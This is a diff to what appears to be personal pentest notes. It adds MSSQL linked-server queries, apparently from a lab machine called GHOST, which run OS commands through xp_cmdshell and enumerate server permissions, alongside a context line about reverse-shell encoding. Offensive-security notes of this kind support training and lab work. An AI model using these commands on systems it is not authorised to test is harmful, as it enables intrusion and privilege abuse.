@@ -28,3 +28,15 @@ ReverseShell wraping using iconv and base64:
 
 https://github.com/antonioCoco/RunasCs/blob/master/compile_commands.txt 
 <img width="1016" height="391" alt="image" src="https://github.com/user-attachments/assets/2a74594d-78b8-43eb-8f3d-cd25031b9026" />
+
+## SQL enumeration cherry
+From GHOST
+
+```
+select * from openquery([PRIMARY], 'select host_name()')
+select * from openquery([PRIMARY], 'exec xp_cmdshell "whoami"') 
+### select raw permissions with ids instead of usernames
+select * from openquery([PRIMARY], 'select * from sys.server_permissions')
+### Select user permissions with usernames replaced id
+select * from openquery([PRIMARY], 'select grantee.name, perm.permission_name from sys.server_permissions perm JOIN sys.server_principals AS grantee on grantee.principal_id = perm.grantee_principal_id') 
+```
